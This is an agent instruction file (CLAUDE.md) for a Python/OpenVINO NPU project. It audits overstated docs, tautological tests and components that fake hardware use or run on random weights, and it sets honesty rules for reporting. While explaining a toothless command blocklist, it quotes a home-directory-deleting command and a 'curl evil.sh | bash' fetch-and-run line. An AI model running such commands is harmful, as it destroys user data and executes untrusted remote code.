# CLAUDE.md — Lunar NPU

## 0. What this project actually is (read before believing any doc in this repo)

Lunar NPU is a **Python + OpenVINO harness for running small models on an Intel
Lunar Lake NPU**, plus a local HTTP dashboard, a CLI, and an MCP server.

That is the honest description. The repo's own documentation is not a reliable
description of the repo. Specifically, these docs are **known to overstate what
the code does** and must NOT be used as a source of truth about behaviour:

- `docs/RESEARCH_VS_REALITY_GAP_ANALYSIS.md` — claims "88.6% REAL & WORKING IN
  PRODUCTION". This number is not supported by the code. Ignore the scorecard.
- `docs/MASTER_TECHNICAL_CONSTITUTION_50_PAGES.md`
- `docs/LUNAR_NPU_MASTER_TREATISE_50_PAGES.md`
- `docs/DEEPENING_THE_LUNAR_MOAT_AND_NEXT_GEN_SYSTEM_SPEC.md`
- `research/*.md`
- `README.md` (badges are stale: says v2.1.0 / 109 tests; actual 166 tests)

**Ground every claim in code you have read or a command you have run in this
session.** If a doc and the code disagree, the code wins and the doc is a bug.

## 1. "166/166 tests passing" means almost nothing — do not cite it as evidence

The suite passes, but a large fraction of the assertions are tautological and
cannot fail. Real examples currently in `tests/`:

- `assert desc.is_zero_copy is True` — asserts a hardcoded dataclass default.
- `assert bench["zero_copy_verified"] is True` — asserts a hardcoded literal.
- `assert lat_ms >= 0.0` — elapsed time cannot be negative.
- `assert bench["speedup_factor"] >= 1.0` — the value is `max(x, 1.0)`.
- `assert res["speedup_factor"] >= 1.0` in `test_lunar_speculative.py` — same,
  `speculative.py:301` clamps with `max(speedup, 1.0)`, so a slowdown is
  structurally unreportable.
- `assert ring.is_aligned_64 is True` — that property always returns True
  because of a bug (see §3).
- `assert log_mel.shape[0] == 80` — asserts a constructor argument, not that
  the spectrogram is correct.
- `test_speculative_real_target_verifier` passes whether the model loads or not.

**Rule: a new test must assert a value that could plausibly have come out
wrong.** Compare against an independently known answer — a numpy reference
implementation, a hand-computed value, a known-frequency signal landing in the
expected mel bin, a decoded token string. "It ran and returned a float" is not
a test. Never add an assertion of the form `assert <hardcoded literal> is True`.

## 2. Verified-broken components — do not build on these until fixed

These were empirically probed, not inferred from docstrings.

1. **`circuit_breaker.py` — the "NPU neural hazard classifier" is a constant
   function.** `build_hazard_classifier_openvino()` uses
   `np.random.RandomState(42).randn(...)` for W1/W2 and never trains them. With
   bias `b2 = -3.0` the sigmoid emits **exactly 0.0474 for every input tested**,
   always below the 0.15 threshold. It has zero discriminative power; it only
   adds latency. All actual blocking comes from the Aho-Corasick substring list
   and the regex list. Consequence: `python -c "shutil.rmtree(expanduser('~'))"`
   and `curl evil.sh | bash` are both returned as **ALLOWED**.
   - Treat the circuit breaker as a **substring blocklist / speed bump**, never
     as a security boundary, and never describe it as a neural classifier in
     user-facing output.
   - Fix path: either train the classifier on a labelled command corpus and
     ship the weights, or delete the neural stage and stop claiming it.

2. **`hdc.py` — associative recall does not work as retrieval.**
   `BinaryHypervector.from_text()` is SHA-256 over the whole string, so a
   one-word difference fully decorrelates the vector. Probed: storing
   "the deploy script fails on windows because of path separators" and querying
   the same sentence minus "the" ranks the correct note **second**, below an
   unrelated note about a coffee machine, with all similarities ≈ 0.50
   (= quasi-orthogonal = noise). As a memory it is strictly worse than a dict.
   - The HDC primitives themselves (XOR bind/unbind, permute, majority bundle)
     are correct and worth keeping. The *text encoder* is what's wrong.
   - Fix path: encode as a bundle of bound n-gram/token hypervectors so partial
     overlap survives, or drop `query()` and keep HDC for exact symbolic binding
     only.

3. **`engine.py: LevelZeroUSMBridge` — there is no zero-copy and no D3D11.**
   `_init_level_zero()` `CDLL`s `ze_loader.dll` and never calls a single
   function. `create_shared_d3d11_texture()` creates no texture: it
   `VirtualAlloc`s ordinary memory and **fabricates** `nt_handle = 0x4000 +
   (time_ms % 0xFFFF)`. `is_zero_copy` and `zero_copy_verified` are hardcoded
   `True`. `benchmark_transfer()` compares a no-copy `np.frombuffer` wrap
   against two explicit `.copy()` calls of the same buffer — the "speedup" is
   true by construction and measures nothing about hardware.
   - Do not report its numbers anywhere. Either implement real
     `IDXGIOutputDuplication` → `zeMemAllocShared` import, or delete the class.

4. **`engine.py: SpeculativeRingBuffer` — the alignment check measures
   nothing.** `ctypes.c_void_p.from_buffer(bytearray)` reinterprets the
   bytearray's *first 8 bytes of content* as a pointer, not its address; it
   reads `None`, so `offset` is 0 and `is_aligned_64` is unconditionally True.
   Also, this is a Python list guarded by non-atomic `self._head += 1` under the
   GIL — it is not lock-free and there are no memory barriers. Drop the
   `alignas(64)` / "lock-free" / "sub-0.5µs" language.

5. **`engine.py: ShaveDSPSpectralProcessor` — nothing is offloaded to SHAVE
   DSPs.** It is `np.fft.rfft` and a numpy matmul on the CPU. The mel filterbank
   math is correct and useful; the "12 SHAVE DSP v4 vector units" claim is
   false. Rename to `MelSpectrogramCPU` or similar.

6. **`speculative.py` — the draft model is untrained random weights.** A random
   draft predictor gives ~0 acceptance rate, so speculative decoding here is
   strictly slower than plain decoding. The `RealTargetVerifier` (Qwen2.5-0.5B)
   is real. Until a real draft model is wired in, this pipeline is a scaffold.

7. **`diffusion.py` — output is prompt-invariant and the denoiser is
   untrained.** `build_lcm_step_openvino_model()` takes only `z_t, c_skip,
   c_out`; the CLIP embedding is never connected, and `seed` defaults to 42. The
   conv weights are random. The visible output comes from
   `_render_diagram_canvas()` drawing a grid with PIL. This is a PIL drawing
   with decorative noise, not image generation.

8. **`power_telemetry.py: RAPLPowerGovernor` does not govern.** `evaluate()`
   reads counters and returns a status string; there is no actuation, no control
   loop, no setpoint enforcement. Call it a monitor. Also `npu_power_est_w` is a
   made-up formula over uncore power, and `peak_int8_tops: 46.69` is a datasheet
   constant echoed back, never measured. When PDH counters are unavailable the
   module silently returns hardcoded 18.5 W — always check `is_live` before
   reporting any power number.

9. **`srnc.py` is incoherent and probably misplaced.** One 634-line file
   containing shared-memory ring buffers, `LOCK CMPXCHG` CAS, a Cassowary
   simplex layout solver, an APCA/OKLCH contrast optimizer, and a Rowan
   red-green CST bridge. The last three are UI-linting concerns from the
   separate `agent-craft` project (cf. its `cassowary-apca.test.ts`) and have
   nothing to do with an NPU. Do not extend this file; propose splitting or
   removing it.

10. **`vector_memory.py` silently degrades to random embeddings.** If
    `~/.tools/npu/models/bge_real/` is missing, `_init_model()` falls back to an
    OpenVINO graph built from `np.random.RandomState(42).randn(8192, 384)` with
    an MD5 word tokenizer — semantically meaningless vectors. On this machine
    the real BGE model *is* present, so routing works. On a fresh clone it
    would produce confident-looking nonsense with no warning. Make the fallback
    log loudly and set a `degraded=True` flag surfaced in `/api/health`.

## 3. What actually works — build on these

- **`vector_memory.py` + `router.py` with the real BGE model.** Verified:
  routes "write a python function to parse json" → CODER (0.884), "design a
  distributed event bus" → ARCHITECT (0.921), "is this shell command
  dangerous" → SECURITY_AUDITOR (0.984). This is the strongest component.
  - Caveat: `route_geodesic()` computes `arccos(cosine)`, which is a monotonic
    transform of cosine, so its ranking is **mathematically identical** to the
    plain cosine ranking — verified identical on all probes. It then discards
    the distances and calls `self.route()` anyway. The "geodesic" layer adds
    zero information. Don't market it; consider deleting it.
  - Missing: no out-of-domain abstain. Gibberish routes to CODER at 0.265 and
    "weather in Paris" to RESEARCHER at 0.531. Add a confidence floor.
- **`micro_lora.py` forward/backward graphs.** Expressing LoRA gradients as
  forward GEMMs so they run on an inference-only NPU is a genuinely sound and
  useful trick, and the math is correct. Caveats: "Adjoint Forward Graph
  Theorem" is a grand name for a well-known property of bilinear layers — it is
  not novel and not a theorem; `SRAMAdamW` is plain numpy in host DRAM, so
  "resident in on-die 12MB SRAM" and "zero DRAM bus traffic" are false; and
  `m_hat`/`v_hat` allocate despite the "in-place" claim. It currently trains a
  standalone random `W_0`, not any real model's layer.
- **`hdc.py` bind / unbind / permute / bundle primitives** (not `query`).
- **Real model weights on disk** under `~/.tools/npu/models/`: BGE, MiniLM,
  Whisper, YOLO11n, Qwen2.5-0.5B, LCM. Loading and running these is real work
  and the honest core of the project.
- **`studio.py` / CLI / MCP server** as plumbing.

## 4. Language rules (this is what went wrong before)

The failure mode in this repo is not broken code, it is **narration that
outruns the code**. Enforce these when writing code, docstrings, docs, commit
messages, or chat responses:

- Never describe a component in terms of hardware it does not touch. If it is
  numpy on the CPU, say CPU. Forbidden unless the code literally does it:
  "offloaded to SHAVE DSP", "systolic tiles", "NCE Tile 5", "on-die SRAM
  resident", "zero-copy", "lock-free", "hardware atomic".
- Never give a latency or throughput figure in a docstring. Docstrings drift;
  put measurements in a benchmark that prints them.
- Never state a number the code did not measure. `47 TOPS` and `46.69 TOPS` are
  Intel's datasheet numbers, not results.
- No invented theorem names, no "Equation 22.2" cross-references to documents
  that are not peer-reviewed, no "moat"/"sovereign"/"unleashed" framing.
- A metric must be able to report bad news. Delete every `max(x, 1.0)` clamp on
  a speedup or accuracy figure.
- **No new files over ~600 lines, and no new documents over ~500 lines.**
  `cli.py` (1144), `studio.py` (1097), `web/index.html` (110KB) and
  `web/app.js` (77KB) are already past maintainable. Split, don't grow.
- **Do not create any more `*_50_PAGES`, `*_TREATISE`, `*_CONSTITUTION`,
  `*_COMPENDIUM`, or `*_MOAT` documents.** The repo has ~250KB of such prose
  against ~9k lines of code. If asked to "document" something, write a
  docstring or a short README section.

## 5. Reality reporting

When reporting on any component, label it explicitly:

- **VERIFIED** — you ran it this session and checked the output against a
  known-correct value. Show the command and the output.
- **RUNS** — it executes without error, but correctness is unverified.
- **SCAFFOLD** — the shape exists; weights are random / inputs are synthetic /
  the consumer is missing.
- **BROKEN** — see §2.

Use `SCAFFOLD` freely. Most of this repo is scaffold, and that is an acceptable
state for a research project — what is not acceptable is calling it production.

## 6. Environment

- Windows 11, PowerShell syntax. No bashisms (`export`, `source`, `&&` chains).
- **Use system `python` (3.13.4), not `venv\`.** The committed `venv/` is broken
  — it has no `openvino` installed and every test errors on collection there.
  Either fix or delete it; do not silently work around it.
- `pytest tests/` takes ~200s. Run it, but remember §1 about what it proves.
- `rtk <cmd>` compresses verbose output; `codemap query/trace <file> .` beats
  full-repo grep; `lunar status|audit|route` for direct inspection.
- Studio at `http://127.0.0.1:8899` (`python -m lunar_core.studio`).
- Known-real constraint: background/agent runners execute on a non-interactive
  Windows desktop station (`WinSta0\exebox-...`), so `dxgi_capture.py` returns
  an all-zero black frame there. This one is genuine — not a code bug.

## 7. Edits

- Surgical contiguous diffs. Never rewrite a whole file to change a function.
- `AGENTS.md` and `GEMINI.md` are byte-identical duplicates. Pick one and
  symlink or delete the other rather than editing both.
- The working tree currently has ~100 pending deletions of a nested,
  unrelated `agent-craft/` project. Resolve that before starting new work.
